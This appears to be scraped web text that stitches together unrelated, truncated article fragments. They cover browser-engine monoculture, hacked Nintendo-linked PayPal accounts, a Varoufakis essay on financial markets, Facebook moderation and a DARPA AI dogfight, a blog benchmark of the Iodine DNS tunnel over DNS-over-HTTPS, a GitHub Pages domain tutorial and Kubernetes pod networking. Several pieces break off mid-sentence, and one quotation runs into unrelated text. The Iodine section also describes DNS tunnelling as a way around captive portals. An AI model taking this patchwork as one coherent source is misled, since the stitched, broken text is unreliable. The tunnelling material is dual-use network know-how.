href="https://en.wikipedia.org/wiki/Blink_(browser_engine)">Blink</a> (Chrome, Microsoft Edge, Opera, etc.)</p><p>This a textbook monoculture. In one sense, it’s a victory for collaboration because nobody’s ‘wasting time’ on competing implementations and web developers can expect the same features and bugs across different browsers. But in a deeper way, it threatens one of the basic principles of how the web has evolved.</p><h3 id="specs--implementations">Specs &amp; implementations</h3><p><picture><source srcset="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-decline.webp" type="image/webp"><img alt="Decline" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-decline.jpg"></picture></p><p>The web has evolved through a combination of <em>specifications</em> and <em>implementations</em>. Organizations like the <a href="https://whatwg.org/">WHATWG</a>, <a href="https://www.w3.org/">W3C</a>, and <a href="https://www.ietf.org/">IETF</a> have been collaboration spaces for independent developers, corporations, and academics to discuss potential new features of the web. Then, browsers would test those ideas out in a variety of implementations.</p><p>This was an interesting structural piece: it reassured us all that it was <em>possible</em> to follow along, and that a multi-participant web was one of our goals. It was frustrating to pull up <a href="https://caniuse.com/">caniuse</a> and see blank spots, but the idea was that different browsers may take the lead in some areas, but everyone catches up eventually. Chrome was not always the first to jump on features, or the first to optimize.</p><p>It’s slower to collaborate than to work alone, but it was beneficial in some ways that we’ve lost now. Chrome has been moving extremely fast, adding new specifications and ideas at a startling rate, and it’s becoming one of the hardest pieces of software to replicate.</p><p>Mike Healy I think <a href="https://twitter.com/mike_hasarms/status/1296575224599556097">said it best</a>:</p><blockquote><p>Do you think the web has almost ‘priced itself out of the market’ in terms of complexity if only 1-2 organisations are capable of building rendering engines for it?</p></blockquote><p>Not only is it nearly impossible to build a new browser from scratch, once you have one the ongoing cost of keeping up with standards requires a full team of experts. Read Drew DeVault’s <a href="https://drewdevault.com/2020/08/13/Web-browsers-need-to-stop.html">Web browsers need to stop</a> for that point, and keep reading all of Drew’s stuff.</p><details><summary>What about Flow?</summary>Yep, there’s a <a href="https://www.ekioh.com/flow-browser/">browser called Flow</a>, which may exist and may support a full range of web standards. If it does exist, I’ll be very excited about it, but it has been teased for almost a year now without any concrete evidence, so it could equally be vaporware.</details><h3 id="the-problem-for-creators">The problem for creators</h3><p>The web has gotten much harder to develop for.</p><p>The web has had about 25 years to grow, few opportunities to shrink, and is now surrounded by an extremely short-sighted culture that is an outgrowth of economic and career short-termism. There are lots of <a href="https://frankchimero.com/blog/2018/everything-easy/">ways to do anything</a>, and some of the most popular ways of building applications on the web are - in my opinion - <a href="https://macwright.com/2020/05/10/spa-fatigue.html">usually ghoulish overkill</a>.</p><p>The best way for folks to enter <em>web development</em> in 2020 is to choose a niche, like <a href="https://vuejs.org/">Vue.js</a> or <a href="https://reactjs.org/">React</a>, and hope that there’s a CSS and accessibility expert on their team.</p><p>For folks who just want to create a web page, who don’t want to enter an industry, there’s a baffling array of techniques, but all the simplest, probably-best ones are stigmatized. It’s easier to stumble into building your resume in React with GraphQL than it is to type some HTML in Notepad.</p><h3 id="the-problem-for-consumers">The problem for consumers</h3><p>We hope that all this innovation is <em>for the user</em>, but often it isn’t. Modern websites seem to be as large, slow, and buggy as they’ve ever been. Our computers are <a href="https://macwright.com/2019/11/15/something-is-wrong-with-computers.html">barely getting faster</a> and our internet connection speeds are stagnating (don’t even <em>try</em> to mention 5G). Webpage <a href="https://www.pingdom.com/blog/webpages-are-getting-larger-every-year-and-heres-why-it-matters/">size growth</a> is outpacing it all.</p><p>The end result is that I no longer expect pages to be fast, even with <a href="https://github.com/gorhill/uBlock">uBlock</a> installed in Firefox and a good local <a href="https://sonic.net/">fiber internet provider</a>.</p><p>I don’t want to lay all of the blame at <em>those web developers</em>, though. Here’s a story from an old job that I find kind of funny. We were collecting some data from user interactions to answer simple questions like “do people click to upload or do they drag &amp; drop?” So we enabled <a href="https://segment.com/">Segment</a>, a tool that lets you add data-collection pipelines by including a single script. The problem, though, is that Segment offered a big page of on/off switches with hundreds of data providers &amp; ad-tech companies on it. And, sure, enough, some folks closer to the business side started <em>clicking all those buttons</em>.</p><p>See, the problem with ads and data tracking is that <em>you can</em>, and who is going to say no? (In that instance, I said no, and added a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP</a> that would block new advertiser access at the page level.)</p><h2 id="recreating-simplicity">Recreating simplicity</h2><blockquote><p>You cannot get a simple system by adding simplicity to a complex system. - <a href="http://erlang.org/pipermail/erlang-questions/2012-March/065087.html">Richard O’Keefe</a></p></blockquote><p>Where do we go from here? Some of the smartest folks out there have been <a href="https://twitter.com/_developit/status/1296628134406692865">advocating for a major version revision</a> of the web.</p><p><em>I am in no way qualified to speculate on a whole new web from scratch, but the <a href="https://www.nytimes.com/2020/08/21/us/california-wildfires.html">air quality</a> is scary so I’m skipping my run and it’s Saturday morning so here we are.</em></p><p>How do we make the web fun, participatory, and good?</p><p>My first thought is that there are two webs:</p><h3 id="the-document-web">The document web</h3><p><picture><source srcset="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-web-pages.webp" type="image/webp"><img alt="Illustration of web pages" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-web-pages.jpg"></picture></p><p>There is the “document web”, like blogs, news, Wikipedia, Twitter, Facebook. This is basically the original vision of the web, as far as I can understand it (I was 2). Basically CSS, which we now think of as a way for designers to add brand identity and tweak pixel-perfect details, was instead mostly a way of making plain documents readable and letting the <em>readers</em> of those documents customize how they looked. This attribute actually <a href="https://twitter.com/autiomaa/status/1296755641164468224">survived for a while in Chrome, in the form of user stylesheets</a>, and <a href="https://davidwalsh.name/firefox-user-stylesheet">still works in Firefox</a>. Though it’s going to be a rough ride in the current web which has basically thrown away <a href="https://en.wikipedia.org/wiki/Semantic_HTML">semantic HTML</a> as an idea.</p><h3 id="the-application-web">The “application” web</h3><p><picture><source srcset="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-machines.webp" type="image/webp"><img alt="Illustration of machines" src="https://macwright.com/images/2020-08-22-clean-starts-for-the-web-illustration-of-machines.jpg"></picture></p><p>Then there’s the “application web”. This started as <em>server</em> applications, built with things like <a href="https://www.djangoproject.com/">Django</a> and <a href="https://rubyonrails.org/">Ruby on Rails</a> and before them a variety of technologies that will live forever in corporations, like <a href="https://en.wikipedia.org/wiki/Jakarta_Servlet">Java Servlets</a>.</p><p><a href="https://backbonejs.org/">Backbone.js</a> demonstrated that a lot of these applications could be moved into the browser, and then <a href="https://reactjs.org/">React</a> and its many SPA-style competitors established a new order for the web – highly-interactive, quite complex, client-side applications.</p><h3 id="the-war-between-the-parts-of-the-web">The war between the parts of the web</h3><p>I posit that this dual-nature is part of what gives the web its magic. But it’s also a destructive force.</p><p>The magic is that a simple blog can be creative expression, can be beautifully interactive. This one isn’t, but I’m just saying - <a href="https://www.typewolf.com/site-of-the-day">it’s possible</a>.</p><p>The problem is that the “document web” is often plagued by application characteristics - it’s the JavaScript and animations and complexity that makes your average newspaper website an unmitigated disaster. Where document websites adopt application patterns they often accidentally sacrifice <a href="https://www.a11yproject.com/">accessibility</a>, performance, and <a href="https://en.wikipedia.org/wiki/Web_scraping">machine readability</a>.</p><p>And the “application web” is plagued by the document characteristics - interactive applications are going to great lengths to avoid most of the essential characteristics of HTML &amp; CSS and just use them as raw materials - avoiding writing any HTML directly at all, avoiding <a href="https://mxstbr.com/thoughts/css-in-js">writing any CSS directly at all</a>, avoiding <a href="https://www.react-spring.io/">default animation features</a>, replacing <a href="https://reactrouter.com/">page-based navigation with something that looks like it but works completely differently</a>. The application web uses <a href="https://reactjs.org/docs/introducing-jsx.html">JSX</a>, not HTML, and would like that in the browser itself, or <a href="https://svelte.dev/">Svelte</a>, instead of JavaScript, and would like that too.</p><p>When I read blog posts from ‘traditional web developers’ who are mad that HTML &amp; CSS aren’t enough anymore and that everything is complicated –&nbsp;I think this is largely that the application stack for building websites has replaced the document stack in a lot of places. Where we would use Jekyll or server-side rendering, we now use React or Vue.js. There are advantages to that, but for a lot of minimally-interactive websites, it’s throwing away decades worth of knowledge in exchange for certain performance perks that might not even matter.</p><p>The appeal of social networks is partly because they let us create <em>documents</em> without thinking about web technology, and they provide guarantees around performance, accessibility, and polish that otherwise would take up our time. You don’t have to think about whether your last Facebook post will load quickly on your friend’s phone or whether your Instagram post will be correctly cropped and resized in the timeline - those things are taken care of.</p><p>To some extent, this doesn’t <em>need</em> to be something that only social networks provide, though: standards like <a href="https://en.wikipedia.org/wiki/RSS">RSS</a> and services like <a href="https://www.instapaper.com/">Instapaper</a> show that pleasing formatting and distribution can be done at the <em>platform level</em> and be provided on top of existing vanilla websites.</p><details><summary>These are not absolutes.</summary>Yeah, I can hear it now: but these categories are not …</details></div></div>

<p>If you have your PayPal account linked to Nintendo please remove it NOW. Hackers are active nowadays and trying to get access to your PayPal, it was informed by some of Social media Users.</p>




<p>Twitter users are reporting that hackers got their PayPal information via their linked Nintendo accounts and are using it to purchase V-bucks. </p>



<p>After a long conversation with the victims, we got that Hackers were managing to discover or tap into people’s PayPal information and use it to purchase V-Bucks, the premium currency for Fortnite.</p>



<p>On Mar 19, 2020, one of the Twitter users advised the Nintendo customers</p>



<blockquote><p> If you have your PayPal account linked to Nintendo please remove it NOW, me and several of my mutuals (among many others) have been hacked and hit with hundreds of dollars worth of charges of fortnite currency </p></blockquote>



<figure><div>
<blockquote data-width="550" data-dnt="true"><div lang="en" dir="ltr"><p>If you have your PayPal account linked to Nintendo please remove it NOW, me and several of my mutuals (among many others) have been hacked and hit with hundreds of dollars worth of charges of fortnite currency</p><p>I am out $250 and trying to keep my shit together and not explode lol</p></div>— ✡ Reed ✡ (@contrabeast) <a href="https://twitter.com/contrabeast/status/1240459185969664001?ref_src=twsrc%5Etfw">March 19, 2020</a></blockquote>
</div></figure>



<p>Furthermore, it was reported that a great number of users who attached their PayPal information to the Nintendo account got affected by the Hackers, although reports suggest that some people don’t even have Fortnite installed.</p>



<p>If you’re also one of them who got affected by the hackers, then you are advised not to contact your Bank on the spot.</p>



<figure><div>
<blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">This happened to my boyfriend a week ago. DO NOT CONTACT YOUR BANK FIRST OR NINTENDO WILL THINK YOUR COMMITTING FRAUD AND SUSPEND YOUR NINTENDO ACCOUNT. Contact them first so they are aware it was a charge not made by you. Just a heads up.</p>— tired bitch (@deceaseddeer) <a href="https://twitter.com/deceaseddeer/status/1240516586659815424?ref_src=twsrc%5Etfw">March 19, 2020</a></blockquote>
</div></figure>



<p>Because of this situation, you’re advised to unlink your PayPal Account. In order to unlink the payment method you first need to sign in to the Nintendo eShop as usual. Once in simply click on your profile icon in the top right-hand corner of the screen and this will bring up your account information. Next, you can scroll down to the PayPal account, which is about four options down. Finally, hit the unlink option to remove the payment method.</p>



<p>Keep in mind, a few days ago <a href="https://nintendosmash.com/nintendo-wants-you-to-use-2-step-verification-to-prevent-unauthorized-log-in-to-your-account/">Nintendo advised us to set a 2-step verification method</a>. This is the only way we can secure our account.</p>

			<h2>Two days ago, something extraordinary happened. Something that has never happened before in the history of capitalism. In Britain, the news came out that the economy had suffered its greatest slump ever – more than 22% down during the first 7 months of 2020. Remarkably, on the same day, the London Stock Exchange, the FTSE100 index, rose by more than 2%. On the same day, during a time America has ground to a halt and is beginning to look like not just as an economy in deep trouble but also, ominously, as a failed state, Wall Street’s SP500 index hit an all-time record.</h2>
<h3>Unable to contain myself, I tweeted the following:</h3>
<blockquote data-width="500" data-dnt="true">
<p lang="en" dir="ltr">Financial capitalism has decoupled from the capitalist economy, skyrocketing out of Earth's orbit, leaving behind it broken lives &amp; dreams. As the UK sinks into the worst recession ever, &amp; US edges toward failed state status, FTSE100 goes up 2% &amp; S&amp;P500 breaks all time record!</p>
<p>— Yanis Varoufakis (@yanisvaroufakis) <a href="https://twitter.com/yanisvaroufakis/status/1293624708307574789?ref_src=twsrc%5Etfw">August 12, 2020</a></p></blockquote>




<h3>Before 2008, the money markets also behaved in a manner that defied humanism. News of mass firings of workers would be routinely followed by sharp rises in the share price of the companies “letting their workers go” – as if they were concerned with their liberation… But at least, there was a capitalist logic to that correlation between firings and share prices. That disagreeable causality was anchored in expectations regarding a company’s actual profits. More precisely, the prediction that a reduction in the company’s wage bill might, to the extent that the loss of personnel lead to lower proportional reductions in output, lead to a rise in profits and, thus, dividends. The mere belief that there were enough speculators out there thinking that there were enough speculators out there who might form that particular expectation was enough to occasion a boost in the share price of companies firing workers.</h3>
<h3>That was then, prior to 2008. Today, this link between profit forecasts and share prices has disappeared and, as a consequence, the share market’s misanthropy has entered a new, post-capitalist phase. This is not as controversial a claim as it may sound at first. In the midst of our current pandemic not one person in their right mind imagines that there are speculators out there who believe that there are enough speculators out there who may believe that company profits in the UK or in the US will rise any time soon. And yet they buy shares with enthusiasm. The pandemic’s effect on our post-2008 world is now creating forces hitherto unfathomable.</h3>
<h3>In today’s world, it would be a mistake to try to find any correlation between what is going on in the real world (of wages, profits, output and sales) and in the money markets. Today, there is no need for a correlation between ‘news’ (e.g. a newsflash that some large multinational fired tens of thousands) and share price hikes. As we watch stock exchanges rise at a time of tanking economies, it would be a mistake to think that speculators hear that the UK economy, or the US economy, have tanked and think to themselves: Great, let’s buy shares. No, the situation is far, far worse!</h3>
<h3>In the post-2008 world, speculators – for the first time in history – don’t actually give a damn about the economy. They, like you and me, can see that Covid-19 has put capitalism in suspended animation. That it is crushing corporate profit margins while also the destroying lives and livelihoods of the many. That it is causing a new tsunami of poverty with long-term effects on aggregate demand. That it demonstrates in every country and every town the pre-existing deep class and race divides, as some of us were privileged enough to keep social distance rules while an army of people out there laboured for a pittance and at risk of infection to cater to our needs.</h3>
<h3>No, what we are living through now is not your typical capitalist disregard for human needs, the standard tendency of the capitalist system to be motivated solely by the needs of profit-maximisation or, as we lefties say, capital accumulation. No, capitalism is now in a new, strange phase: Socialism for the very, very few (courtesy of central banks and governments catering to a tiny oligarchy) and stringent austerity, coupled with cruel competition in an environment of industrial, and technologically advanced, feudalism for almost everyone else.</h3>
<h3>This week’s events in Wall Street and the City of London mark this turning point – the historic moment that future historians will undoubtedly pick to say: It was in the summer of 2020 when financial capitalism finally broke with the world of real people, including capitalists antiquated enough to try to profit from producing goods and services.</h3>
<h3>But let us begin at the beginning. How did it all begin?</h3>
<h3>Before capitalism, debt appeared at the very end of the economic cycle; a mere reflection of the power to accumulate already produced surpluses. Under feudalism,</h3>
<ul>
<li>
<h3>production came first with the peasants working the land to plant and harvest crops.</h3>
</li>
<li>
<h3>Distribution followed the harvest, as the sheriff collected the lord’s share. Part of this share was later monetised when the lord’s men sold it at some market.</h3>
</li>
<li>
<h3>Debt only emerged at the very last stage of the cycle when the lord would lend his money to debtors, the King often amongst them.</h3>
</li>
</ul>
<h3>Capitalism reversed the order. Once labour and land had been commodified, debt was necessary before production even began. Landless capitalists had to borrow to lease workers, land and machines. Only then could production begin, yielding revenues whose residual claimant were the capitalists. Thus, debt powered capitalism’s early oeuvre. However, it took the second industrial revolution before capitalism could re-shape the world in its image.</h3>
<h3>The invention of electromagnetism, on the back of James Clerk Maxwell’s famous equations, gave rise to the first networked company, Edison for example that produced everything from the power generation stations and the electricity grid to the light bulb in every house. The funding needed to build these megafirms was, naturally, beyond the limits of the small banks of the 19<sup>th</sup> century. Thus, the megabank was born, as a result of mergers and acquisitions, along with a remarkable capacity to create money out of thin air. The agglomeration of these megafirms and megabanks created a new Technostructure that usurped markets, democracies and the mass media. The roaring 1920s, leading to the crash of 1929, was the result.</h3>
<h3>From 1933 to 1971, global capitalism was centrally managed and planned under different versions of the New Deal, that included the War Economy and the Bretton Woods system. Following the demise of Bretton Woods in the early 1970s, capitalism returned to a version of the 1920s: Under the ideological guise of neoliberalism (which was neither new nor liberal), the Technostructure again took over from governments. Our generation’s 1929, that happened in 2008 was the result.</h3>
<h3>Following the crash of 2008, capitalism changed drastically. In their attempt to re-float the crashed financial system, central banks channelled rivers of cheap debt-money to the financial sector, in exchange for universal fiscal austerity that limited the middle and lower classes’ demand for goods and services. Unable to profit from austerity-hit consumers, corporations and financiers were hooked up to the central banks’ constant drip-feed of fictitious debt.</h3>
<h3>Every time the Fed or the European Central Bank or the Bank of England pumped more money into the commercial banks, in the hope that these monies would be lent to companies which would in turn create new jobs and product lines, the birth of the strange world we now live in came a little closer. How? As an example, consider the following chain reaction: The European Central Bank extended new liquidity to Deutsche Bank. Deutsche Bank could only profit from it if it found someone to borrow this money. Dedicated to the banker’s mantra “never lend to someone who needs the money”, Deutsche Bank would never lend it to the “little people”, whose circumstances were increasingly diminished (along with their ability to repay any substantial loans), it preferred to lend it to, say, Volkswagen. But, in turn, Volkswagen executives looked at the “little people” out there and thought to themselves: “Their circumstances are diminishing, they won’t be able to afford new, high quality electric cars.” And so Volkswagen postponed crucial investments in new technologies and in new high quality jobs. But, Volkswagen executives would have been remiss not to take the dirt-cheap loans offered by Deutsche Bank. So, they took it. And what did they do with the freshly minted ECB-monies? They used it to buy Volkswagen shares in the stock exchange. The more of those shares they bought the higher Volkswagen’s share value. And since the Volkswagen executives’ salary bonuses were linked to the company’s share value, they profited personally – while, at once, the ECB’s firepower was well and truly wasted from society’s, and indeed from industrial capitalism’s, point of view.</h3>
<h3>This was the process by which, from 2008 to 2020, the policies to re-float the banking sector from 2009 onwards resulted in the almost complete zombification of corporations. Covid-19 found capitalism in this zombified state. With consumption and production hit massively and at once, governments were forced to step into the void to replace all incomes to a gargantuan extent at a time the real capitalist economy has the least capacity to generate real wealth. The decoupling of the financial markets from the real economy, that was the trigger for this talk, is a sure sign that something we may defensibly label postcapitalism is already underway.</h3>
<h3>My difference with fellow lefties is that I do not believe there is <em>any</em> guarantee that what follows capitalism – let’s call it, for want of a better term, postcapitalism – will be better. It may well be utterly dystopic, judging by present phenomena. In the …</h3></section></article></div></div>

<p>Facebook has made significant progress recently to proactively take down content that violate its community standards.
For example, in the second quarter of 2020, Facebook took down 104.6 million pieces of content.
While reviews are typically performed by a vast workforce of human moderators, AI-powered tools have enabled Facebook to do this work at a greater scale for textual content.</p>

<p>However, there’s a long way to go for these systems to match or exceed the capabilities of human moderators.
This is because a large proportion of hate speech and misinformation is in the form of images and memes, and reasoning about the context and language-image interplay is an extremely difficult challenge for AI.</p>

<blockquote>
  <p>Given Facebook’s scale and the speed at which some use it to spread hate, incite violence, and share lies with millions, Facebook will have to keep running to catch up.</p>

<p>The Defense Advanced Research Project Agency (DARPA) recently hosted a simulated F16 dogfight competition, with different AI bots competing with each other as well as with human pilots.
The top AI bot was able to beat a human pilot 5-0 in the simulated contest.
DARPA started this program “as a risk-reduction effort […] to flesh out how human and machine pilots share operational control of a fighter jet to maximize its chances of mission success.”
Competition runners are broadly optimistic about the demonstration of AI capabilities, even if they are not close to being deployed on a real aircraft.
Of concern, the program had little discussion on the ethics of AI military applications, especially with the lethal autonomous weapon systems being considered.</p>

            <!--kg-card-begin: markdown--><p><a href="https://code.kryo.se/iodine/">Iodine</a> is a DNS-tunnel that can be used to send TCP traffic encapsulated in DNS queries. Sometimes, this helps to bypass captive portals or otherwise restricted networks.</p>
<p>In this blogpost I'll test the performance of using Iodine in combination with <a href="https://en.wikipedia.org/wiki/DNS_over_HTTPS">DoH (DNS-over-HTTPS)</a>.</p>
<!-- more -->  
<p>For my test setup, I spun up a vanilla debian VM using vagrant and installed iodine in it. I have an iodine server running on one of my servers, but I won't cover the steps to install and configure it here, because <a href="https://0day.work/tunneling-all-traffic-over-dns-with-a-socks-proxy/">I already wrote a post about it</a>.</p>

<p>Before we start experimenting with DNS-over-HTTPS, let's measure the baseline performance of the DNS tunnel. For the measurements I used the TCP-based network throughput testing tool <a href="https://iperf.fr/">iperf</a>.</p>
<h2 id="rawmode">Raw mode</h2>
<p>Iodine has a raw mode - and if I understood it correctly - it sends the DNS traffic directly to the iodine DNS server, without going through the DNS resolver. That allows for quite a high bandwidth:</p>
<p><img src="https://0day.work/content/images/2019/02/iodine-raw.png" alt="Iodine raw connection"></p>
<p>As you can see, we can easily push more than 50mbit/s through the tunnel. Not too bad, I think.</p>
<h2 id="querymode">Query mode</h2>
<p>So in essence, using the raw mode is kinda cheating, because usually - at least with captive portals - a specific DNS resolver is enforced at the network level and we cannot simply bypass it.<br>
With that limitation in place, iodine has to send a lot of small DNS queries to transfer our traffic.</p>
<p>As we can see below, the initialisation phase gets longer, because iodine tries to figure out the best query type and maximum fragment size to use.</p>
<p><img src="https://0day.work/content/images/2019/02/iodine-query.png" alt="Iodine query connection 1"></p>
<p><img src="https://0day.work/content/images/2019/02/iodine-query2.png" alt="Iodine query connection 2"></p>
<p>The bandwidth went down from 50 mbit/s to only around 350 - 450 <strong>kbit/s</strong>.  That does not sound much, but ~ 50 kb/s might still be enough to slowly download a document at an airport or check one's emails in an emergency, but won't be enough to watch YouTube videos.</p>

<p><a href="https://en.wikipedia.org/wiki/DNS_over_HTTPS">DoH (DNS-over-HTTPS)</a> is a technique where DNS queries are not send in plaintext via UDP to DNS servers. Instead, the queries are send using TLS-encrypted HTTPS requests to special DoH API servers. For example, <a href="https://developers.cloudflare.com/1.1.1.1/dns-over-https/">Cloudflare operates such a server</a>.</p>
<p>You can use <code>curl</code> to resolve the A record for <code>0day.work</code> like this:</p>
<pre><code>$&gt; curl --silent -H 'accept: application/dns-json' 'https://cloudflare-dns.com/dns-query?name=0day.work&amp;type=A' | js-beautify
{
    "Status": 0,
    "TC": false,
    "RD": true,
    "RA": true,
    "AD": false,
    "CD": false,
    "Question": [{
        "name": "0day.work.",
        "type": 1
    }],
    "Answer": [{
        "name": "0day.work.",
        "type": 1,
        "TTL": 10789,
        "data": "185.26.156.49"
    }]
}
</code></pre>
<h2 id="dnscryptproxy">dnscrypt-proxy</h2>
<p><a href="https://github.com/jedisct1/dnscrypt-proxy/">dnscrypt-proxy</a> is a tool written in Go that can act as a local DNS resolver which transparently forwards the DNS queries to a DoH server.</p>
<p>The setup is quite straight forward: Simply download one of the pre-built <a href="https://github.com/jedisct1/dnscrypt-proxy/releases">releases packages</a>, rename the <code>example-dnscrypt-proxy.toml</code> to <code>dnscrypt-proxy.toml</code> and then run <code>sudo ./dnscrypt-proxy</code>. But before that, I changed <code>dnscrypt_servers = true</code> to <code>false</code>, so that the proxy will only use DoH to resolve the DNS queries.</p>
<p><img src="https://0day.work/content/images/2019/02/dnscrypt-resolv.png" alt="dnscrypt running and changed /etc/resolv.conf"><br>
Now we only have to tell our system to use the dnscrypt-proxy as its resolver. For that, we comment out all lines in <code>/etc/resolv.conf</code> and add <code>nameserver 127.0.0.1</code>, because the proxy bound itself to port 53. All queries from our system will go towards our dnscrypt proxy.</p>
<p>A test query using the tool <code>dig</code> shows that the proxy works and we can resolve DNS records over DoH:<br>
<img src="https://0day.work/content/images/2019/02/dnscrypt-dig.png" alt="dnscrypt DNS query test"></p>
<h2 id="iodineanddoh">Iodine and DoH</h2>
<p>Let's get to the interesting part: The performance of Iodine over the DoH-based DNS resolver.</p>
<p>Spoiler: It is terrible :-( It also took me multiple tries until iodine managed to setup the tunnel.</p>
<p><img src="https://0day.work/content/images/2019/02/iodine-dnscrypt.png" alt="Iodine performance over DoH 1"></p>
<p>In the lower part of the screenshot you can see that <code>tshark</code> does not capture any packets going out over port 53. That means that iodine is really using the dnscrypt-proxy.</p>
<p><img src="https://0day.work/content/images/2019/02/iodine-dnscrypt2.png" alt="Iodine performance over DoH 2"></p>
<p>We can also see that iodine throws several errors/warnings and complains about server's replies.</p>
<p>In the end we have only between 30 - 90 kbit/s. I have not tried starting a SSH session or something else. Maybe mosh might somewhat work, but I do not believe that using iodine over DoH is a pleasant experience in general.</p>
<p>To be honest, it does not surprise me at all, because each DNS query that iodine sends is a separate HTTPS request and as you might have seen in the first dnscrypt screenshot, the average RTT is between 18ms - 78ms.</p>

    <p>For this tutorial I will be assuming you have already setup a site on Github Pages that’s being run on the standard <code>USERNAME.github.io</code> domain. If you haven’t done so, a quick Google search will yield lots of articles explaining the process. I’m using Bluehost as my domain provider, but the steps should be similar for any major domain provider.</p>
<h2 id="setup-in-github-repository">Setup in Github repository</h2>
<p>In your Github repo for the site, navigate to the “Settings” tab. Scroll down and you will find an area for Github Pages setup. In the Custom Domain section, enter the domain name you want to use and click save.
<img src="https://i.imgur.com/UEKZ7VS.png" alt="Github Domain">
If you’re using a static site generator, you may already have a file in your repo called CNAME. If you don’t, you can create one. Inside this file, place the domain name. 
<img src="https://i.imgur.com/NQKTehC.png" alt="CNAME"></p>
<h2 id="host-record-setup">Host record setup</h2>
<p>Now open the domain provider that you are using, and navigate to the DNS section for the domain you are interested in using.</p>
<p>First you will need to add four A host records. The host record for each of these is “@”. The image below shows what it looks like on Bluehost. 
<img src="https://i.imgur.com/3B5bev3.png" alt="A host">
The four IP addresses (at the time of writing this) for each record to be added are:</p>
<ul>
<li>185.199.108.153</li>
<li>185.199.109.153</li>
<li>185.199.110.153</li>
<li>185.199.111.153</li>
</ul>
<p>Next, we need to add a CNAME record for the www site record. This will be in the format <code>USERNAME.github.io</code>
<img src="https://i.imgur.com/P3zGhXl.png" alt="CNAME"></p>
<p>That’s it! The records will probably take some time to update, so be patient. After they update you should see your site live on the domain you’ve provided.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>One of the core requirements of the
<a href="https://kubernetes.io/docs/concepts/cluster-administration/networking/#the-kubernetes-network-model" target="_blank" rel="noopener">Kubernetes networking model</a> is that every pod should get its own IP address and that every pod in the cluster should be able to talk to it using this IP address. There are several network providers (flannel, calico, canal, etc.) that implement this networking model.</p><p>As I started working on Kubernetes, it wasn’t completely clear to me how every pod is assigned an IP address. I understood how various components worked independently, however, it wasn’t clear how these components fit together. For instance, I understood what CNI plugins were, however, I didn’t know how they were invoked. So, I wanted to write this post to share what I have learned about various networking components and how they are stitched together in a kubernetes cluster for every pod to receive an IP address.</p><p>There are various ways of setting up networking in kubernetes and various options for a container runtime. For this post, I will use
<a href="https://github.com/coreos/flannel" target="_blank" rel="noopener">Flannel</a> as the network provider and
<a href="https://github.com/containerd/containerd" target="_blank" rel="noopener">Containerd</a> as the container runtime. Also, I am going to assume that you know how container networking works and only share a very brief overview below for context.</p><h2 id="some-background-concepts">Some Background Concepts</h2><h3 id="container-networking-a-very-brief-overview">Container Networking: A Very Brief Overview</h3><p>There are some really good posts explaining how container networking works. For context, I will go over a very high level overview here with a single approach that involves linux bridge networking and packet encapsulation. I am skipping details here as container networking deserves a blog post of itself. Some of the posts that I have found to be very educational in this space are
<a href="#container-networking">linked in the references below</a>.</p><h4 id="containers-on-the-same-host">Containers on the same host</h4><p>One of the ways containers running on the same host can talk to each other via their IP addresses is through a linux bridge. In the kubernetes (and docker) world, a
<a href="https://man7.org/linux/man-pages/man4/veth.4.html" target="_blank" rel="noopener">veth (virtual ethernet)</a> device is created to achieve this. One end of this veth device is inserted into the container network namespace and the other end is connected to a
<a href="https://wiki.archlinux.org/index.php/Network_bridge" target="_blank" rel="noopener">linux bridge</a> on the host network. All containers on the same host have one end of this veth pair connected to the linux bridge and they can talk to each other using their IP addresses via the bridge. The linux bridge is also assigned an IP address and it acts as a gateway for egress traffic from pods destined to different nodes.
<img src="https://ronaknathani.com/blog/2020/08/how-a-kubernetes-pod-gets-an-ip-address/bridge-networking.png" alt="bridge networking"></p><h4 id="containers-on-different-hosts">Containers on different hosts</h4><p>One of the ways containers running on different hosts can talk to each other via their IP addresses is by using packet encapsulation. Flannel supports this through
<a href="https://vincent.bernat.ch/en/blog/2017-vxlan-linux" target="_blank" rel="noopener">vxlan</a> which wraps the original packet inside a UDP packet and sends it to the destination.</p><p>In a kubernetes cluster, flannel creates a vxlan device and some route table entries on each of the nodes. Every packet that’s destined for a container on a different host goes through the vxlan device and is encapsulated in a UDP packet. On the destination, the encapsulated packet is retrieved and the packet is routed through to the destined pod.

Various container runtimes implement the CRI API and this allows users to use the container runtime of their choice in their kubernetes installation.</p><h3 id="what-is-cni">What is CNI?</h3><p><a href="https://github.com/containernetworking/cni" target="_blank" rel="noopener">CNI project</a> includes a
<a href="https://github.com/containernetworking/cni/blob/master/SPEC.md" target="_blank" rel="noopener">spec</a> to provide a generic plugin-based networking solution for linux containers. It also consists of various
<a href="https://github.com/containernetworking/plugins" target="_blank" rel="noopener">plugins</a> which perform different functions in configuring the pod network. A CNI plugin is an executable that follows the CNI spec and we’ll discuss some plugins in the post below.</p><h2 id="assigning-subnets-to-nodes-for-pod-ip-addresses">Assigning Subnets To Nodes For Pod IP Addresses</h2><p>If all pods are required to have an IP address, it’s important to ensure that all pods across the entire cluster have a unique IP address. This is achieved by assigning each node a unique subnet from which pods are assigned IP addresses on that node.</p><h3 id="node-ipam-controller">Node IPAM Controller</h3><p>When <code>nodeipam</code> is passed as an option to the
<a href="https://kubernetes.io/docs/reference/command-line-tools-reference/kube-controller-manager/" target="_blank" rel="noopener">kube-controller-manager’s</a> <code>--controllers</code> command line flag, it allocates each node a dedicated subnet (podCIDR) from the cluster CIDR (IP range for the cluster network). Since these podCIDRs are disjoint subnets, it allows assigning each pod a unique IP address.</p><p>A kubernetes node is assigned a podCIDR when the node first registers with the cluster. To change the podCIDR allocated to nodes in a cluster, nodes need to be de-registered and then re-registered with any configuration changes first applied to the kubernetes control plane. <code>podCIDR</code> for a node can be listed using the following command.</p><pre><code>$ kubectl get no &lt;nodeName&gt; -o json | jq '.spec.podCIDR'
10.244.0.0/24
</code></pre><h2 id="kubelet-container-runtime-and-cni-plugins---how-its-all-stitched-together">Kubelet, Container Runtime and CNI Plugins - how it’s all stitched together</h2><p>When a pod is scheduled on a node, a lot of things happen to start up a pod. In this section, I’ll only focus on the interactions that relate to configuring network for the pod.</p><p>Once a pod is scheduled on the node, the following interactions result in configuring the network and starting the application container.
